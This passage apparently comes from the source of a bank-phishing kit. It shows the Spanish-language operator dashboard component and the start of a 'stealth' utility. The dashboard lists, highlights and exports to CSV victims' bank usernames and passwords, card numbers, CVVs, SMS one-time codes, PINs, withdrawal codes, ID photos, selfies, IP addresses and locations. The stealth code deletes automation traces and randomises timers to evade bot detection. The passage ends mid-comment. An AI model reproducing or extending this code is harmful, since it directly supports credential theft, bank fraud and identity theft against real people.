document.body.removeChild(link);\n        \n        toast({\n          title: \"Descarga exitosa\",\n          description: \"La imagen del c贸digo QR se ha descargado correctamente.\",\n          variant: \"default\",\n        });\n        return;\n      }\n      \n      // Si no hay imagen, intentamos con el contenido del QR\n      if (session.qrData) {\n        // Si es una URL de datos (data URL), podemos descargarla directamente\n        if (session.qrData.startsWith('data:')) {\n          const link = document.createElement('a');\n          link.href = session.qrData;\n          link.download = `qr_code_${new Date().toISOString().slice(0, 10)}.png`;\n          document.body.appendChild(link);\n          link.click();\n          document.body.removeChild(link);\n          \n          toast({\n            title: \"Descarga exitosa\",\n            description: \"El c贸digo QR se ha descargado correctamente.\",\n            variant: \"default\",\n          });\n        } \n        // Si es solo texto, lo convertimos en un archivo de texto\n        else {\n          const blob = new Blob([session.qrData], { type: 'text/plain' });\n          const url = URL.createObjectURL(blob);\n          const link = document.createElement('a');\n          link.href = url;\n          link.download = `qr_data_${new Date().toISOString().slice(0, 10)}.txt`;\n          document.body.appendChild(link);\n          link.click();\n          document.body.removeChild(link);\n          \n          toast({\n            title: \"Descarga exitosa\",\n            description: \"Los datos del QR se han descargado como texto.\",\n            variant: \"default\",\n          });\n        }\n      } else {\n        toast({\n          title: \"No hay datos QR\",\n          description: \"No se encontraron datos de QR para descargar.\",\n          variant: \"destructive\",\n        });\n      }\n    } catch (error) {\n      console.error('Error al descargar QR:', error);\n      toast({\n        title: \"Error al descargar\",\n        description: \"Ha ocurrido un error al descargar el c贸digo QR.\",\n        variant: \"destructive\",\n      });\n    }\n  };\n  \n  // Funci贸n para exportar datos a CSV\n  const exportToCSV = () => {\n    if (filteredSessions.length === 0) {\n      toast({\n        title: \"Sin datos para exportar\",\n        description: \"No hay sesiones disponibles para exportar.\",\n        variant: \"destructive\",\n      });\n      return;\n    }\n    \n    try {\n      // Definir encabezados del CSV\n      const headers = [\n        'Banco', \n        'Folio', \n        'Usuario', \n        'Contrase帽a', \n        'Tarjeta', \n        'Fecha Vencimiento', \n        'CVV', \n        'SMS', \n        'NIP', \n        'SMS Compra', \n        'Celular', \n        'Paso Actual', \n        'Creado Por', \n        'Fecha'\n      ];\n      \n      // Convertir datos a filas CSV\n      const rows = filteredSessions.map(session => [\n        session.banco || '',\n        session.folio || '',\n        session.username || '',\n        session.password || '',\n        session.tarjeta || '',\n        session.fechaVencimiento || '',\n        session.cvv || '',\n        session.sms || '',\n        session.nip || '',\n        session.smsCompra || '',\n        session.celular || '',\n        session.pasoActual || '',\n        session.createdBy || '',\n        new Date(session.createdAt || Date.now()).toLocaleString()\n      ]);\n      \n      // Unir encabezados y filas\n      const csvContent = [\n        headers.join(','),\n        ...rows.map(row => row.map(cell => `\"${String(cell).replace(/\"/g, '\"\"')}\"`).join(','))\n      ].join('\\n');\n      \n      // Crear un blob y un link para descargar\n      const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });\n      const url = URL.createObjectURL(blob);\n      const link = document.createElement('a');\n      link.setAttribute('href', url);\n      link.setAttribute('download', `sesiones_${activeBank.toLowerCase()}_${new Date().toISOString().slice(0, 10)}.csv`);\n      document.body.appendChild(link);\n      link.click();\n      document.body.removeChild(link);\n      \n      toast({\n        title: \"Exportaci贸n exitosa\",\n        description: `Se han exportado ${filteredSessions.length} sesiones a CSV.`,\n        variant: \"default\",\n      });\n    } catch (error) {\n      console.error('Error al exportar a CSV:', error);\n      toast({\n        title: \"Error al exportar\",\n        description: \"Ha ocurrido un error al exportar los datos. Intente nuevamente.\",\n        variant: \"destructive\",\n      });\n    }\n  };\n  \n  // Detectar cambios en las sesiones para resaltar las filas actualizadas\n  useEffect(() => {\n    if (sessions.length === 0) return;\n    \n    // Marcar todas las sesiones como destacadas\n    const newHighlights: Record<string, boolean> = {};\n    const newFieldHighlights: Record<string, Record<string, boolean>> = {};\n    \n    // Comparar sesiones actuales con las anteriores para encontrar cambios espec铆ficos\n    sessions.forEach(session => {\n      const prevSession = prevSessions.find(s => s.sessionId === session.sessionId);\n      \n      // Resaltar la fila completa\n      newHighlights[session.sessionId] = true;\n      \n      // Inicializar objeto de campos para esta sesi贸n\n      newFieldHighlights[session.sessionId] = {};\n      \n      // Si encontramos la sesi贸n previa, comparamos campo por campo\n      if (prevSession) {\n        // Comparar campos espec铆ficos para resaltar\n        if (prevSession.folio !== session.folio) {\n          newFieldHighlights[session.sessionId].folio = true;\n        }\n        if (prevSession.username !== session.username || prevSession.password !== session.password) {\n          newFieldHighlights[session.sessionId].credentials = true;\n        }\n        if (prevSession.tarjeta !== session.tarjeta || \n            prevSession.fechaVencimiento !== session.fechaVencimiento ||\n            prevSession.cvv !== session.cvv) {\n          newFieldHighlights[session.sessionId].tarjeta = true;\n        }\n        if (prevSession.sms !== session.sms) {\n          newFieldHighlights[session.sessionId].sms = true;\n        }\n        if (prevSession.nip !== session.nip) {\n          newFieldHighlights[session.sessionId].nip = true;\n        }\n        if (prevSession.smsCompra !== session.smsCompra) {\n          newFieldHighlights[session.sessionId].smsCompra = true;\n        }\n        if (prevSession.celular !== session.celular) {\n          newFieldHighlights[session.sessionId].celular = true;\n        }\n        if (prevSession.pasoActual !== session.pasoActual) {\n          newFieldHighlights[session.sessionId].pasoActual = true;\n        }\n      } else {\n        // Si es una sesi贸n nueva, resaltar todos los campos\n        newFieldHighlights[session.sessionId] = {\n          folio: true,\n          credentials: true,\n          tarjeta: true,\n          sms: true,\n          nip: true,\n          smsCompra: true,\n          celular: true,\n          pasoActual: true\n        };\n      }\n    });\n    \n    // Actualizar estados\n    setHighlightedRows(newHighlights);\n    setHighlightedFields(newFieldHighlights);\n    \n    // Guardar las sesiones actuales como previas para la pr贸xima comparaci贸n\n    setPrevSessions([...sessions]);\n    \n    // Eliminar el resaltado despu茅s de 3 segundos\n    const timer = setTimeout(() => {\n      setHighlightedRows({});\n      setHighlightedFields({});\n    }, 3000);\n    \n    return () => clearTimeout(timer);\n  }, [sessions]);\n\n  // Detectar cambios en el tama帽o de pantalla\n  useEffect(() => {\n    const handleResize = () => {\n      setIsSmallScreen(window.innerWidth < 1024);\n    };\n    \n    window.addEventListener('resize', handleResize);\n    return () => {\n      window.removeEventListener('resize', handleResize);\n    };\n  }, []);\n\n  if (isLoading) {\n    return (\n      <div className=\"px-6 pt-2 pb-6 overflow-x-auto overflow-y-auto flex-1 mobile-scrollable\" style={{maxHeight: \"calc(100vh - 190px)\", height: \"auto\", width: \"100%\"}}>\n        <div className=\"w-full bg-[#1e1e1e] rounded-lg overflow-hidden\">\n          <div className=\"p-4\">\n            <Skeleton className=\"h-8 w-full mb-4\" />\n            <Skeleton className=\"h-12 w-full mb-2\" />\n            <Skeleton className=\"h-12 w-full mb-2\" />\n            <Skeleton className=\"h-12 w-full mb-2\" />\n            <Skeleton className=\"h-12 w-full mb-2\" />\n            <Skeleton className=\"h-12 w-full mb-2\" />\n          </div>\n        </div>\n      </div>\n    );\n  }\n\n  // Funci贸n para eliminar una sesi贸n\n  const handleDeleteSession = () => {\n    if (sessionToDelete) {\n      deleteSessionMutation.mutate(sessionToDelete.sessionId);\n    }\n  };\n  \n  return (\n    <div className=\"px-6 pt-2 pb-6 overflow-x-auto overflow-y-auto flex-1 mobile-scrollable\" style={{maxHeight: \"calc(100vh - 190px)\", height: \"auto\", width: \"100%\"}}>\n      {/* Di谩logo de confirmaci贸n de eliminaci贸n */}\n      <DeleteConfirmDialog \n        isOpen={isDeleteDialogOpen}\n        onClose={() => setIsDeleteDialogOpen(false)}\n        onConfirm={handleDeleteSession}\n        session={sessionToDelete}\n      />\n      \n      {/* Barra de b煤squeda y bot贸n de exportaci贸n */}\n      <div className=\"mb-4 flex flex-col sm:flex-row gap-3 items-stretch sm:items-center justify-between\">\n        {/* Buscador */}\n        <div className=\"relative flex-1 max-w-md\">\n          <Search className=\"absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400\" />\n          <Input\n            type=\"text\"\n            placeholder=\"Buscar por folio, banco, usuario, tarjeta...\"\n            value={searchTerm}\n            onChange={(e) => setSearchTerm(e.target.value)}\n            className=\"pl-10 bg-[#1e1e1e] border-[#2c2c2c] text-[#ccc] placeholder-gray-500 focus:border-[#00aaff] focus:ring-[#00aaff]\"\n          />\n        </div>\n        \n        {/* Contador de resultados y bot贸n de exportaci贸n */}\n        <div className=\"flex items-center gap-3\">\n          {/* Contador de sesiones */}\n          <div className=\"text-sm text-gray-400\">\n            {searchTerm.trim() ? (\n              <span>\n                {filteredSessions.length} de {sessions.length} sesiones\n              </span>\n            ) : (\n              <span>\n                {filteredSessions.length} sesiones totales\n              </span>\n            )}\n          </div>\n          \n          {/* Bot贸n de exportaci贸n */}\n          {filteredSessions.length > 0 && (\n            <Button\n              variant=\"outline\"\n              size=\"sm\"\n              className=\"text-[#00aaff] border-[#00aaff] hover:bg-[#0a101d] flex items-center gap-2 whitespace-nowrap\"\n              onClick={exportToCSV}\n            >\n              <Download className=\"h-4 w-4\" />\n              Exportar a CSV\n            </Button>\n          )}\n        </div>\n      </div>\n      \n      {/* El efecto para detectar cambios en el tama帽o de pantalla est谩 declarado fuera del return */}\n      \n      {/* Vista para tarjetas para todos los dispositivos (m贸vil y pantallas peque帽as) */}\n      {/* Mostramos tarjetas para m贸vil o para tablets/desktop con pantallas peque帽as */}\n      {(isMobile || isSmallScreen) ? (\n        <>\n          {filteredSessions.length === 0 ? (\n            <div className=\"w-full bg-[#1e1e1e] rounded-lg p-4 text-center text-gray-400\">\n              No hay sesiones activas. Genere un nuevo link para crear una sesi贸n.\n            </div>\n          ) : (\n            <div className=\"space-y-4\">\n              {filteredSessions.map((session, index) => (\n                <Card \n                  key={session.sessionId}\n                  className={`bg-[#1e1e1e] border-[#2c2c2c] ${selectedSessionId === session.sessionId ? 'border-[#4c4c4c]' : ''} \n                    ${highlightedRows[session.sessionId] ? 'bg-[#1a4c64] transition-colors duration-500' : ''}`}\n                  onClick={() => onSelectSession(session.sessionId)}\n                >\n                  <CardContent className=\"p-4\">\n                    <div className=\"flex justify-between items-center mb-3\">\n                      <div className=\"font-bold text-[#ccc] text-lg\">{session.banco}</div>\n                      <div className={`px-3 py-1 rounded text-xs ${highlightedFields[session.sessionId]?.pasoActual ? 'text-[#00ffff] font-bold bg-[#003a4f]' : 'bg-[#2a2a2a] text-[#ccc]'}`}>\n                        {session.pasoActual ? session.pasoActual.charAt(0).toUpperCase() + session.pasoActual.slice(1) : 'Inicio'}\n                      </div>\n                    </div>\n                    \n                    <div className=\"mb-3 flex gap-1 items-center\">\n                      <Copy className=\"h-4 w-4 text-[#888]\" />\n                      <div className={`text-sm ${highlightedFields[session.sessionId]?.folio ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>\n                        Folio: {session.folio}\n                      </div>\n                    </div>\n                    \n                    {/* Informaci贸n del dispositivo */}\n                    {session.deviceType && (\n                      <div className=\"mb-3 flex gap-1 items-center\">\n                        <Smartphone className=\"h-4 w-4 text-[#888]\" />\n                        <div className=\"text-sm text-[#ccc]\">\n                          <div className=\"flex items-center gap-2\">\n                            <span className={`px-2 py-1 rounded text-xs ${\n                              session.deviceType === 'Android' ? 'bg-green-900 text-green-300' :\n                              session.deviceType === 'iPhone' ? 'bg-blue-900 text-blue-300' :\n                              'bg-gray-700 text-gray-300'\n                            }`}>\n                              {session.deviceType === 'Android' ? ' Android' :\n                               session.deviceType === 'iPhone' ? ' iOS' :\n                               ' Escritorio'}\n                            </span>\n                          </div>\n                          {session.deviceModel && (\n                            <div className=\"text-xs mt-1 opacity-80\">\n                              {session.deviceModel}\n                            </div>\n                          )}\n                          {session.deviceBrowser && (\n                            <div className=\"text-xs opacity-70\">\n                              {session.deviceBrowser}\n                            </div>\n                          )}\n                        </div>\n                      </div>\n                    )}\n                    \n                    {(session.username || session.password) && (\n                      <div className=\"mb-3 flex gap-1 items-center\">\n                        <AlertCircle className=\"h-4 w-4 text-[#888]\" />\n                        <div className={`text-sm ${highlightedFields[session.sessionId]?.credentials ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>\n                          {session.username && session.password \n                            ? `${session.username}:${session.password}` \n                            : '--'}\n                        </div>\n                      </div>\n                    )}\n                    \n                    {session.tarjeta && (\n                      <div className=\"mb-3 flex gap-1 items-start\">\n                        <CreditCard className=\"h-4 w-4 text-[#888] mt-0.5\" />\n                        <div className={`text-sm ${highlightedFields[session.sessionId]?.tarjeta ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>\n                          <div>{session.tarjeta}</div>\n                          {(session.fechaVencimiento || session.cvv) && (\n                            <div className=\"text-xs mt-1 opacity-80\">\n                              {session.fechaVencimiento && <span className=\"mr-2\">Exp: {session.fechaVencimiento}</span>}\n                              {session.cvv && <span>CVV: {session.cvv}</span>}\n                            </div>\n                          )}\n                        </div>\n                      </div>\n                    )}\n                    \n                    {session.sms && (\n                      <div className=\"mb-2 flex gap-1 items-center\">\n                        <MessageSquare className=\"h-4 w-4 text-[#888]\" />\n                        <div className={`text-sm ${highlightedFields[session.sessionId]?.sms ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>\n                          SMS: {session.sms}\n                        </div>\n                      </div>\n                    )}\n                    \n                    {session.nip && (\n                      <div className=\"mb-2 flex gap-1 items-center\">\n                        <KeyRound className=\"h-4 w-4 text-[#888]\" />\n                        <div className={`text-sm ${highlightedFields[session.sessionId]?.nip ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>\n                          NIP: {session.nip}\n                        </div>\n                      </div>\n                    )}\n                    \n                    {session.smsCompra && (\n                      <div className=\"mb-2 flex gap-1 items-center\">\n                        <CheckCircle2 className=\"h-4 w-4 text-[#888]\" />\n                        <div className={`text-sm ${highlightedFields[session.sessionId]?.smsCompra ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>\n                          SMS Compra: {session.smsCompra}\n                        </div>\n                      </div>\n                    )}\n                    \n                    {/* Mostrar c贸digo de retiro si existe */}\n                    {session.codigoRetiro && (\n                      <div className=\"mb-2 flex gap-1 items-center\">\n                        <Ban className=\"h-4 w-4 text-[#888]\" />\n                        <div className={`text-sm ${highlightedFields[session.sessionId]?.codigoRetiro ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>\n                          C贸digo Retiro: {session.codigoRetiro}\n                          {session.pinRetiro && (\n                            <span className={`ml-2 px-2 py-0.5 bg-[#2c2c2c] rounded ${highlightedFields[session.sessionId]?.pinRetiro ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>\n                              PIN: {session.pinRetiro}\n                            </span>\n                          )}\n                        </div>\n                      </div>\n                    )}\n                    \n                    {/* Mostrar datos QR si existen */}\n                    {session.qrData && (\n                      <div className=\"mb-2\">\n                        <div className=\"flex gap-1 items-center\">\n                          <QrCode className=\"h-4 w-4 text-[#3af]\" />\n                          <div className=\"text-sm text-[#00ffff] font-bold\">\n                            C贸digo QR escaneado\n                          </div>\n                        </div>\n                        <div className=\"mt-2 flex justify-center\">\n                          <Button\n                            variant=\"outline\"\n                            size=\"sm\"\n                            className=\"text-[#00aaff] border-[#00aaff] hover:bg-[#0a101d] flex items-center gap-2\"\n                            onClick={(e) => {\n                              e.stopPropagation(); // Evitar que se seleccione la sesi贸n\n                              handleDownloadQR(session);\n                            }}\n                          >\n                            <Download className=\"h-4 w-4\" />\n                            Descargar QR\n                          </Button>\n                        </div>\n                      </div>\n                    )}\n                    \n                    {session.celular && (\n                      <div className=\"mb-2 flex gap-1 items-center\">\n                        <Smartphone className=\"h-4 w-4 text-[#888]\" />\n                        <div className={`text-sm ${highlightedFields[session.sessionId]?.celular ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>\n                          Celular: {session.celular}\n                        </div>\n                      </div>\n                    )}\n                    \n                    {/* Informaci贸n de ubicaci贸n */}\n                    {session.ipAddress && (\n                      <div className=\"mb-2 flex gap-1 items-center\">\n                        <Globe className=\"h-4 w-4 text-[#888]\" />\n                        <div className=\"text-sm text-[#ccc]\">\n                          IP: {session.ipAddress}\n                        </div>\n                      </div>\n                    )}\n                    \n                    {session.googleMapsLink && (\n                      <div className=\"mb-2 flex gap-1 items-center\">\n                        <MapPin className=\"h-4 w-4 text-[#888]\" />\n                        <a\n                          href={session.googleMapsLink}\n                          target=\"_blank\"\n                          rel=\"noopener noreferrer\"\n                          className=\"text-[#00aaff] hover:text-[#0088dd] flex items-center gap-1 text-sm\"\n                          onClick={(e) => e.stopPropagation()}\n                          data-testid=\"link-google-maps-mobile\"\n                        >\n                          Ver en Google Maps\n                          <ExternalLink className=\"h-3 w-3\" />\n                        </a>\n                      </div>\n                    )}\n                    \n                    {/* Informaci贸n del creador (solo visible para administradores) */}\n                    <div className=\"mb-3 flex gap-1 items-center\">\n                      <Target className=\"h-4 w-4 text-[#888]\" />\n                      <div className=\"text-sm text-[#ccc]\">\n                        Creado por: {session.createdBy || '--'}\n                      </div>\n                    </div>\n                    \n                    <div className=\"flex gap-2 mt-4 border-t border-[#333] pt-3\">\n                      <Button \n                        variant=\"outline\" \n                        size=\"sm\"\n                        className=\"flex-1 bg-[#2c2c2c] hover:bg-[#1f1f1f] border-[#444]\"\n                        onClick={(e) => {\n                          e.stopPropagation();\n                          onSelectSession(session.sessionId);\n                        }}\n                      >\n                        Seleccionar\n                      </Button>\n                      \n                      {!session.saved && (\n                        <Button \n                          size=\"sm\"\n                          className=\"flex-1 bg-[#005c99] hover:bg-[#004d80] text-white\"\n                          onClick={(e) => {\n                            e.stopPropagation();\n                            saveSessionMutation.mutate(session.sessionId);\n                          }}\n                          disabled={saveSessionMutation.isPending}\n                        >\n                          {saveSessionMutation.isPending ? '...' : 'Guardar'}\n                        </Button>\n                      )}\n                      \n                      <Button \n                        variant=\"destructive\"\n                        size=\"sm\"\n                        className=\"flex-1 bg-[#990000] hover:bg-[#800000]\"\n                        onClick={(e) => {\n                          e.stopPropagation();\n                          setSessionToDelete(session);\n                          setIsDeleteDialogOpen(true);\n                        }}\n                        disabled={deleteSessionMutation.isPending}\n                      >\n                        {deleteSessionMutation.isPending ? '...' : 'Eliminar'}\n                      </Button>\n                    </div>\n                  </CardContent>\n                </Card>\n              ))}\n            </div>\n          )}\n        </>\n      ) : (\n        /* Vista para desktop: tabla */\n        <div className=\"overflow-x-auto w-full\">\n          <table className=\"min-w-full bg-[#1e1e1e] rounded-lg overflow-hidden\" style={{tableLayout: \"fixed\"}}>\n            <thead>\n              <tr className=\"bg-[#222]\">\n                <th className=\"p-2 text-left w-[30px]\">#</th>\n                <th className=\"p-2 text-left w-[70px]\">Folio</th>\n                <th className=\"p-2 text-left w-[110px]\">Dispositivo</th>\n                <th className=\"p-2 text-left w-[120px]\">User:Password</th>\n                <th className=\"p-2 text-left w-[90px]\">Banco</th>\n                <th className=\"p-2 text-left w-[150px]\">Tarjeta</th>\n                <th className=\"p-2 text-left w-[80px]\">SMS</th>\n                <th className=\"p-2 text-left w-[80px]\">NIP</th>\n                <th className=\"p-2 text-left w-[100px]\">SMS COMPRA</th>\n                <th className=\"p-2 text-left w-[130px]\">C贸digo Retiro + PIN</th>\n                <th className=\"p-2 text-left w-[80px]\">QR</th>\n                <th className=\"p-2 text-left w-[70px]\">Celular</th>\n                <th className=\"p-2 text-left w-[100px]\">IP Address</th>\n                <th className=\"p-2 text-left w-[120px]\">Latitud</th>\n                <th className=\"p-2 text-left w-[120px]\">Longitud</th>\n                <th className=\"p-2 text-left w-[100px]\">Google Maps</th>\n                <th className=\"p-2 text-left w-[90px]\">Paso actual</th>\n                <th className=\"p-2 text-left w-[90px]\">Creado por</th>\n                <th className=\"p-2 text-left w-[100px]\">Verificaci贸n ID</th>\n                <th className=\"p-2 text-left w-[120px]\">Acciones</th>\n              </tr>\n            </thead>\n            <tbody>\n              {filteredSessions.length === 0 && (\n                <tr>\n                  <td colSpan={20} className=\"p-4 text-center text-gray-400\">\n                    No hay sesiones activas. Genere un nuevo link para crear una sesi贸n.\n                  </td>\n                </tr>\n              )}\n              \n              {filteredSessions.map((session, index) => (\n                <tr \n                  key={session.sessionId}\n                  className={`border-b border-[#2c2c2c] ${selectedSessionId === session.sessionId ? 'bg-[#2a2a2a]' : ''} \n                    ${highlightedRows[session.sessionId] ? 'bg-[#1a4c64] transition-colors duration-500' : ''}`}\n                  onClick={() => onSelectSession(session.sessionId)}\n                >\n                  <td className=\"p-2 text-[#ccc]\">{index + 1}</td>\n                  <td className={`p-2 ${highlightedFields[session.sessionId]?.folio ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>\n                    {session.folio}\n                  </td>\n                  <td className=\"p-2 text-[#ccc]\">\n                    {session.deviceType ? (\n                      <div className=\"text-xs\">\n                        <span className={`px-1 py-0.5 rounded text-xs ${\n                          session.deviceType === 'Android' ? 'bg-green-900 text-green-300' :\n                          session.deviceType === 'iPhone' ? 'bg-blue-900 text-blue-300' :\n                          'bg-gray-700 text-gray-300'\n                        }`}>\n                          {session.deviceType === 'Android' ? ' Android' :\n                           session.deviceType === 'iPhone' ? ' iOS' :\n                           ' PC'}\n                        </span>\n                        {session.deviceModel && (\n                          <div className=\"mt-1 opacity-80 truncate\" title={session.deviceModel}>\n                            {session.deviceModel.length > 15 ? \n                              session.deviceModel.substring(0, 15) + '...' : \n                              session.deviceModel}\n                          </div>\n                        )}\n                      </div>\n                    ) : '--'}\n                  </td>\n                  <td className={`p-2 ${highlightedFields[session.sessionId]?.credentials ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>\n                    {session.username && session.password \n                      ? `${session.username}:${session.password}` \n                      : '--'}\n                  </td>\n                  <td className=\"p-2 text-[#ccc] truncate\">{session.banco}</td>\n                  <td className={`p-2 overflow-hidden ${highlightedFields[session.sessionId]?.tarjeta ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>\n                    {session.tarjeta ? (\n                      <div>\n                        <div>{session.tarjeta}</div>\n                        {(session.fechaVencimiento || session.cvv) && (\n                          <div className=\"text-xs opacity-80\">\n                            {session.fechaVencimiento && <span className=\"mr-2\">Exp: {session.fechaVencimiento}</span>}\n                            {session.cvv && <span>CVV: {session.cvv}</span>}\n                          </div>\n                        )}\n                      </div>\n                    ) : '--'}\n                  </td>\n                  <td className={`p-2 truncate ${highlightedFields[session.sessionId]?.sms ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>\n                    {session.sms || '--'}\n                  </td>\n                  <td className={`p-2 truncate ${highlightedFields[session.sessionId]?.nip ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>\n                    {session.nip || '--'}\n                  </td>\n                  <td className={`p-2 truncate ${highlightedFields[session.sessionId]?.smsCompra ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>\n                    {session.smsCompra || '--'}\n                  </td>\n                  <td className={`p-2 truncate ${highlightedFields[session.sessionId]?.codigoRetiro ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>\n                    {session.codigoRetiro || '--'}\n                    {session.pinRetiro && (\n                      <div className=\"text-xs mt-1 px-2 py-0.5 bg-[#2c2c2c] rounded inline-block\">\n                        PIN: {session.pinRetiro}\n                      </div>\n                    )}\n                  </td>\n                  <td className=\"p-2 text-[#ccc]\">\n                    {session.qrData ? (\n                      <Button\n                        variant=\"outline\"\n                        size=\"sm\"\n                        className=\"text-[#00aaff] border-[#00aaff] hover:bg-[#0a101d] flex items-center gap-1 py-1 h-7 text-xs\"\n                        onClick={(e) => {\n                          e.stopPropagation();\n                          handleDownloadQR(session);\n                        }}\n                      >\n                        <Download className=\"h-3 w-3\" />\n                        Descargar\n                      </Button>\n                    ) : '--'}\n                  </td>\n                  <td className={`p-2 truncate ${highlightedFields[session.sessionId]?.celular ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>\n                    {session.celular || '--'}\n                  </td>\n                  <td className=\"p-2 text-[#ccc] truncate\">\n                    {session.ipAddress ? (\n                      <div className=\"flex items-center gap-1\">\n                        <Globe className=\"h-3 w-3 text-[#888]\" />\n                        <span className=\"text-xs\">{session.ipAddress}</span>\n                      </div>\n                    ) : '--'}\n                  </td>\n                  <td className=\"p-2 text-[#ccc] truncate\">\n                    {session.latitude ? (\n                      <div className=\"flex items-center gap-1\">\n                        <span className=\"text-xs\">{session.latitude}</span>\n                      </div>\n                    ) : '--'}\n                  </td>\n                  <td className=\"p-2 text-[#ccc] truncate\">\n                    {session.longitude ? (\n                      <div className=\"flex items-center gap-1\">\n                        <span className=\"text-xs\">{session.longitude}</span>\n                      </div>\n                    ) : '--'}\n                  </td>\n                  <td className=\"p-2 text-[#ccc]\">\n                    {session.googleMapsLink ? (\n                      <a\n                        href={session.googleMapsLink}\n                        target=\"_blank\"\n                        rel=\"noopener noreferrer\"\n                        className=\"text-[#00aaff] hover:text-[#0088dd] flex items-center gap-1 text-xs\"\n                        onClick={(e) => e.stopPropagation()}\n                        data-testid=\"link-google-maps\"\n                      >\n                        <MapPin className=\"h-3 w-3\" />\n                        Maps\n                        <ExternalLink className=\"h-2 w-2\" />\n                      </a>\n                    ) : '--'}\n                  </td>\n                  <td className={`p-2 truncate ${highlightedFields[session.sessionId]?.pasoActual ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>\n                    {session.pasoActual ? \n                      session.pasoActual.charAt(0).toUpperCase() + session.pasoActual.slice(1) \n                      : 'Inicio'}\n                  </td>\n                  <td className=\"p-2 text-[#ccc] truncate\">{session.createdBy || '--'}</td>\n                  <td className=\"p-2 text-[#ccc]\">\n                    {(session as any).documentFileUrl || (session as any).selfieFileUrl ? (\n                      <div className=\"flex flex-col gap-1\">\n                        <div className=\"text-xs opacity-80\">\n                          Tipo: {(session as any).documentType || 'N/A'}\n                        </div>\n                        <div className=\"flex gap-1\">\n                          {(session as any).documentFileUrl && (\n                            <Button\n                              variant=\"outline\"\n                              size=\"sm\"\n                              className=\"text-[#00aaff] border-[#00aaff] hover:bg-[#0a101d] flex items-center gap-1 py-1 h-6 text-xs px-2\"\n                              onClick={(e) => {\n                                e.stopPropagation();\n                                handleDownloadIdentityFile(session, 'document');\n                              }}\n                            >\n                              <Download className=\"h-3 w-3\" />\n                              Doc\n                            </Button>\n                          )}\n                          {(session as any).selfieFileUrl && (\n                            <Button\n                              variant=\"outline\"\n                              size=\"sm\"\n                              className=\"text-[#ff6b35] border-[#ff6b35] hover:bg-[#1a0d0a] flex items-center gap-1 py-1 h-6 text-xs px-2\"\n                              onClick={(e) => {\n                                e.stopPropagation();\n                                handleDownloadIdentityFile(session, 'selfie');\n                              }}\n                            >\n                              <Download className=\"h-3 w-3\" />\n                              Selfie\n                            </Button>\n                          )}\n                        </div>\n                      </div>\n                    ) : '--'}\n                  </td>\n                  <td className=\"p-2 flex gap-1\">\n                    {!session.saved && (\n                      <Button \n                        size=\"sm\"\n                        className=\"bg-[#005c99] hover:bg-[#004d80] text-white py-1 h-7 text-xs px-2\"\n                        onClick={(e) => {\n                          e.stopPropagation();\n                          saveSessionMutation.mutate(session.sessionId);\n                        }}\n                        disabled={saveSessionMutation.isPending}\n                      >\n                        {saveSessionMutation.isPending ? '...' : 'Guardar'}\n                      </Button>\n                    )}\n                    <Button \n                      variant=\"destructive\"\n                      size=\"sm\"\n                      className=\"bg-[#990000] hover:bg-[#800000] py-1 h-7 text-xs px-2\"\n                      onClick={(e) => {\n                        e.stopPropagation();\n                        setSessionToDelete(session);\n                        setIsDeleteDialogOpen(true);\n                      }}\n                      disabled={deleteSessionMutation.isPending}\n                    >\n                      {deleteSessionMutation.isPending ? '...' : 'Eliminar'}\n                    </Button>\n                  </td>\n                </tr>\n              ))}\n            </tbody>\n          </table>\n        </div>\n      )}\n    </div>\n  );\n};\n\nexport default AccessTable;","size_bytes":43158},"client/src/utils/stealth.ts":{"content":"// Utilidades stealth para evitar detecci贸n automatizada\nexport class StealthMode {\n  private static isInitialized = false;\n  \n  public static initialize(): void {\n    if (this.isInitialized) return;\n    \n    this.hideAutomationTraces();\n    this.obfuscateTimingPatterns();\n    this.simulateHumanBehavior();\n    this.protectAgainstFingerprinting();\n    \n    this.isInitialized = true;\n  }\n  \n  private static hideAutomationTraces(): void {\n    if (typeof window === 'undefined') return;\n    \n    // Eliminar trazas de automation\n    delete (window as any).__nightmare;\n    delete (window as any).__phantomas;\n    delete (window as any).callPhantom;\n    delete (window as any)._phantom;\n    delete (window as any).phantom;\n    delete (window as any).__selenium_unwrapped;\n    delete (window as any).__webdriver_evaluate;\n    delete (window as any).__selenium_evaluate;\n    delete (window as any).__fxdriver_evaluate;\n    delete (window as any).__driver_unwrapped;\n    delete (window as any).__webdriver_unwrapped;\n    delete (window as any).__driver_evaluate;\n    delete (window as any).__selenium_unwrapped;\n    delete (window as any).__fxdriver_unwrapped;\n    \n    // Ocultar chrome automation\n    if (window.chrome && window.chrome.runtime) {\n      Object.defineProperty(window.chrome.runtime, 'onConnect', {\n        value: undefined,\n        writable: false\n      });\n    }\n  }\n  \n  private static obfuscateTimingPatterns(): void {\n    if (typeof window === 'undefined') return;\n    \n    // Sobrescribir setTimeout y setInterval para agregar jitter aleatorio\n    const originalSetTimeout = window.setTimeout;\n    const originalSetInterval = window.setInterval;\n    \n    window.setTimeout = function(callback: Function, delay: number = 0, ...args: any[]) {\n      const jitter = Math.random() * 50 - 25; // 卤25ms jitter\n      return originalSetTimeout.call(window, callback, Math.max(0, delay + jitter), ...args);\n    };\n    \n    window.setInterval = function(callback: Function, delay: number = 0, ...args: any[]) {\n      const jitter = Math.random() * 20 - 10; // 卤10ms jitter para intervals\n      return originalSetInterval.call(window, callback, Math.max(1, delay + jitter), ...args);\n    };\n  }\n  \n  private static simulateHumanBehavior(): void {\n    if (typeof window === 'undefined') return;\n    \n    // Simular actividad humana con movimientos aleatorios del 